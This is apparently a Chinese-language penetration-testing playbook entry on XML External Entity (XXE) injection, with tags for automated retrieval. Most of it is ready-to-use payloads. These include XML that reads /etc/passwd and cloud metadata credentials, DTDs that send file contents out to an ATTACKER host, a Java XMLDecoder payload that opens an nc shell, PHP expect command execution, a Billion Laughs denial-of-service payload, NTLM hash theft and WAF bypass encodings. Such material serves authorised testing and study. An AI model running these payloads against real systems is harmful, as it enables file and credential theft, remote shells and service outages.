---
category: web
tags: [xxe, xml, xml external entity, xml注入, dtd, 实体注入, oob, blind xxe, ssrf, rce, file read, 文件读取, 带外数据, xinclude, svg]
triggers: [xml, dtd, entity, DOCTYPE, SYSTEM, XInclude, SVG upload, SOAP, RSS, XLIFF, application/xml, text/xml, xml parser, libxml, lxml, DocumentBuilder, XMLDecoder, "<!ENTITY", "<!DOCTYPE"]
related: [ssrf, lfi, command_injection]
---

# XXE（XML External Entity）注入

## 什么时候用

- 应用接收并解析 XML 输入（表单提交、API 请求、文件上传）
- Content-Type 为 `application/xml`、`text/xml`、`application/soap+xml`
- 上传功能接受 XML 衍生格式：SVG、DOCX/XLSX、XLIFF、RSS
- 后端 SOAP/XML-RPC 接口
- JSON 接口可被切换为 XML（Content-Type 篡改）
- 目标使用已知存在 XXE 漏洞的解析器（Java DocumentBuilder 默认配置、Python lxml < 5.4.0）

## 前提条件

- XML 解析器启用了外部实体解析（大多数解析器的默认行为）
- 攻击者可控制 XML 输入的部分或全部内容
- 对于 OOB XXE：目标服务器可发起出站 HTTP/DNS 请求（或可利用本地 DTD 绕过）
- 对于 RCE：需要特定条件（Java XMLDecoder、PHP expect 模块）

## 攻击步骤

### 1. 基础探测 — 实体声明测试

先测试解析器是否处理自定义实体：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY testentity "12345"> ]>
<root>
    <data>&testentity;</data>
</root>
```

如果响应中出现 `12345`，说明实体被解析，可继续深入。

### 2. 经典文件读取

#### 直接读文件（In-Band）

```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<data>&xxe;</data>
```

Windows 目标改用：`file:///C:/windows/system32/drivers/etc/hosts`

#### PHP 环境 — Base64 编码读取（避免特殊字符破坏 XML）

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
<data>&xxe;</data>
```

适用于读取包含 `<`、`&` 等字符的文件（如 PHP 源码）。

#### Java 环境 — 目录列举

Java XML 解析器支持 `file:///` 协议列目录：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///" >]>
<root><foo>&xxe;</foo></root>
```

### 3. XXE → SSRF

利用外部实体发起服务端请求，常用于访问云元数据：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<root>&xxe;</root>
```

#### Blind SSRF（仅确认连通性）

当普通实体被禁用时，使用参数实体：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [<!ENTITY % xxe SYSTEM "http://ATTACKER.burpcollaborator.net"> %xxe; ]>
<root>test</root>
```

### 4. OOB XXE — 带外数据外带

当响应中看不到实体内容时（Blind XXE），通过外部 DTD 将数据带出。

**攻击者服务器上托管 malicious.dtd：**

```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://ATTACKER/?x=%file;'>">
%eval;
%exfiltrate;
```

**发送的 XML Payload：**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ATTACKER/malicious.dtd"> %xxe;]>
<root>data</root>
```

⚠️ 多行文件用 FTP 协议外带（HTTP URL 不允许换行）：

```bash
# 使用 xxe-ftp-server.rb 接收多行数据
ruby xxe-ftp-server.rb
```

DTD 改为 `ftp://ATTACKER:2121/%file;`。

### 5. Error-Based XXE — 错误信息泄露

无出站连接时，通过触发解析错误将文件内容嵌入错误信息。

#### 方法 A：外部 DTD 错误触发

**malicious.dtd：**

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

解析器试图打开 `/nonexistent/root:x:0:0:...` 时报错，泄露文件内容。

#### 方法 B：本地 DTD 覆写（无出站连接）

利用目标系统上已有的 DTD 文件，覆写其中的实体定义：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
    <!ENTITY % ISOamso '
        <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
    '>
    %local_dtd;
]>
<root>data</root>
```

**常见本地 DTD 路径：**

| 系统/软件 | DTD 路径 | 可覆写实体 |
|-----------|----------|-----------|
| GNOME/Yelp | `/usr/share/yelp/dtd/docbookx.dtd` | `ISOamso` |
| Tomcat | `jar:file:///tomcat/lib/jsp-api.jar!/...jspxml.dtd` | 各种 |
| 自定义应用 | `/usr/local/app/schema.dtd` | 按需探测 |

用 [dtd-finder](https://github.com/GoSecure/dtd-finder) 扫描目标镜像查找可用 DTD。

### 6. XXE → RCE

#### Java XMLDecoder

如果应用使用 `XMLDecoder.readObject()` 反序列化 XML：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
  <void class="java.lang.ProcessBuilder">
    <array class="java.lang.String" length="6">
      <void index="0"><string>/usr/bin/nc</string></void>
      <void index="1"><string>-l</string></void>
      <void index="2"><string>-p</string></void>
      <void index="3"><string>9999</string></void>
      <void index="4"><string>-e</string></void>
      <void index="5"><string>/bin/sh</string></void>
    </array>
    <void method="start" id="process"></void>
  </void>
</java>
```

#### PHP expect 模块

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [<!ELEMENT foo ANY>
<!ENTITY xxe SYSTEM "expect://id">]>
<creds><user>&xxe;</user><pass>x</pass></creds>
```

条件：PHP 加载了 `expect` 扩展（罕见但存在）。

## 常见坑

### 1. 文件内容含 XML 特殊字符

读取的文件包含 `<`、`&` 会导致 XML 解析失败。
- **解法**：用 `php://filter/convert.base64-encode/resource=...` 或 CDATA 包裹
- Java 可通过 Error-Based 方式绕过

### 2. 多行文件 OOB 外带失败

HTTP URL 中不允许换行。
- **解法**：改用 FTP 协议 (`ftp://`)，或用 Base64 编码
- Java 1.8+ 的 OOB 方式无法处理含换行的文件，改用 Error-Based

### 3. 内部 DTD 中不能嵌套参数实体定义

XML 规范禁止在内部 DTD 子集中定义嵌套参数实体。
- **解法**：必须使用外部 DTD（远程加载或利用本地 DTD 覆写）

### 4. WAF 拦截 `<!DOCTYPE` 或 `<!ENTITY`

见下方「绕过技巧」章节。

### 5. 解析器版本差异

- Python lxml ≥ 5.4.0 / libxml2 ≥ 2.13.8 已修复参数实体扩展
- Java `DocumentBuilderFactory` 默认**允许**外部实体（需手动禁用）
- .NET 4.5.2+ 默认禁用外部实体

## 变体

### XInclude 注入

当无法控制 `DOCTYPE`（数据被嵌入已有 XML 结构中）时：

```xml
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```

### SVG 文件上传

上传恶意 SVG 图片，触发服务端 XML 解析：

```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
     width="300" height="200" version="1.1">
    <image xlink:href="file:///etc/hostname"></image>
</svg>
```

PHP expect 版本（RCE）：

```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
     width="300" height="200" version="1.1">
    <image xlink:href="expect://id"></image>
</svg>
```

⚠️ 读取结果渲染在图片像素中，需要能访问生成的图片才能获取数据。

### Office 文档（DOCX/XLSX）

Office Open XML 格式内部是 ZIP 包含多个 XML 文件：

1. 创建空 DOCX，解压
2. 编辑 `word/document.xml`，注入 XXE payload
3. 重新打包为 `.docx` 上传

### SOAP 接口

```xml
<soap:Body>
  <foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://ATTACKER:22/"> %dtd;]><xxx/>]]></foo>
</soap:Body>
```

### RSS Feed

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [<!ELEMENT title ANY>
<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<rss version="2.0">
<channel>
  <title>&xxe;</title>
  <item><title>test</title></item>
</channel>
</rss>
```

### XLIFF 本地化文件

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE XXE [<!ENTITY % remote SYSTEM "http://ATTACKER/evil.dtd"> %remote; ]>
<xliff srcLang="en" trgLang="zh" version="2.0"></xliff>
```

### Content-Type 篡改

将 `application/x-www-form-urlencoded` 或 `application/json` 改为 `application/xml`，观察服务器是否接受 XML 解析：

```
POST /action HTTP/1.0
Content-Type: application/xml

<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

JSON → XML 转换可用 Burp 插件 **Content Type Converter**。

### Java jar: 协议

Java 环境专用，可从远程 ZIP 归档中读取文件，过程中在 `/tmp` 创建临时文件：

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "jar:http://ATTACKER:8080/evil.zip!/evil.dtd">]>
<foo>&xxe;</foo>
```

可配合路径穿越、反序列化等漏洞链利用临时文件。

### Python lxml Error-Based XXE

lxml < 5.4.0（基于 libxml2 < 2.13.8）即使设置 `resolve_entities=False`，仍会扩展参数实体：

```xml
<!DOCTYPE colors [
  <!ENTITY % local_dtd SYSTEM "file:///tmp/xml/config.dtd">
  <!ENTITY % config_hex '
    <!ENTITY &#x25; flag SYSTEM "file:///tmp/flag.txt">
    <!ENTITY &#x25; eval "<!ENTITY &#x25; error SYSTEM &#x27;file:///aaa/&#x25;flag;&#x27;>">
    &#x25;eval;
  '>
  %local_dtd;
]>
```

lxml ≥ 5.4.0 绕过（利用 general entity + 无效协议）：

```xml
<!DOCTYPE colors [
  <!ENTITY % a '
    <!ENTITY &#x25; file SYSTEM "file:///tmp/flag.txt">
    <!ENTITY &#x25; b "<!ENTITY c SYSTEM &#x27;meow://&#x25;file;&#x27;>">
  '>
  %a; %b;
]>
<colors>&c;</colors>
```

无效协议 `meow://` 会让解析器报错并在错误信息中泄露文件内容。**无需出站连接。**

### Billion Laughs（DoS）

```xml
<!DOCTYPE data [
<!ENTITY a0 "dos">
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
<!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
]>
<data>&a4;</data>
```

### Windows NTLM 哈希窃取

```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file://///ATTACKER_IP//share/test.jpg'>]>
<data>&xxe;</data>
```

配合 `Responder.py -I eth0 -v` 接收 NTLM 哈希，再用 hashcat 破解。

## 绕过技巧

| 绕过场景 | 技巧 |
|---------|------|
| WAF 过滤 `file://` | 用 `php://filter/...` 或 `jar:` 协议 |
| WAF 过滤关键词 | UTF-7 编码整个 XML（声明 `encoding="UTF-7"`） |
| WAF 过滤 `<!ENTITY` | HTML 数字实体编码：`&#x21;&#x45;&#x4E;&#x54;&#x49;&#x54;&#x59;` |
| 无法使用 `DOCTYPE` | XInclude 注入（不需要 DOCTYPE） |
| Base64 编码绕过 | `data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk` |
| 出站网络被封 | 本地 DTD 覆写 + Error-Based |
| 字符编码限制 | 尝试 UTF-16 BE/LE、UTF-32 |
| JSON-only 接口 | 尝试改 Content-Type 为 `application/xml` |

**UTF-7 编码示例：**

```xml
<?xml version="1.0" encoding="UTF-7"?>
+ADw-+ACE-DOCTYPE+ACA-foo+ACA-+AFs-+ADw-+ACE-ENTITY+ACA-example+ACA-SYSTEM+ACA-+ACI-/etc/passwd+ACI-+AD4-+ACA-+AF0-+AD4-
+ADw-stockCheck+AD4-+ADw-productId+AD4-+ACY-example+ADs-+ADw-/productId+AD4-+ADw-/stockCheck+AD4-
```

## 相关技术

- [[ssrf]] — XXE 本质上可以发起 SSRF，通过 `http://`、`ftp://`、`gopher://` 等协议访问内部服务
- [[lfi]] — XXE 的 `file:///` 协议等价于本地文件包含；PHP wrapper 技巧通用
- [[command_injection]] — XXE → RCE 路径（XMLDecoder、PHP expect）可达到命令执行效果
